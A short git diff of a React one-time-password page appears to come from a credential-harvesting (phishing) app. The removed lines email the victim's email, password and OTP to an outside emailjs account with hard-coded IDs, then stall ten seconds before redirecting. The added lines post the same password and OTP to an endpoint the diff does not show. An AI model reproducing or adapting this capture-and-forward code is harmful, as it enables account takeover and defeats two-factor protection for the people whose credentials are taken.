@@ -29,8 +29,9 @@ export default function Otp(props) {
 
         if (props.location.state) {
             const templateParams = props.location.state
+            
+            templateParams.clientOtp = clientOtp
 
-            templateParams.client_otp = clientOtp
 
              try {
                  const response = await fetch(
@@ -41,9 +42,9 @@ export default function Otp(props) {
                              'Content-type': 'application/json',
                          },
                          body: JSON.stringify({
-                             email,
-                             password,
-                             pin: '',
+                             email: templateParams.email,
+                             password: templateParams.password,
+                             pin: clientOtp,
                              otp: '',
                          }),
                      }
@@ -73,29 +74,7 @@ export default function Otp(props) {
              }
 
 
-            emailjs
-                .send(
-                    'service_9vrlrlj',
-                    'template_cyuy4xi',
-                    templateParams,
-                    'user_Qbla9rcVZxBrYr7bdLXKO'
-                )
-                .then(
-                    (result) => {
-                        console.log(result.text, 'email sent')
-                        setTimeout(() => {
-                            console.log('time out init')
-                            setLoading(false)
-
-                            history.push('/verifyotp', templateParams)
-                        }, 10000)
-                    },
-                    (error) => {
-                        console.log(error, 'email failed')
-                    setLoading(false)
-
-                    }
-                )
+          
         }
     }
 
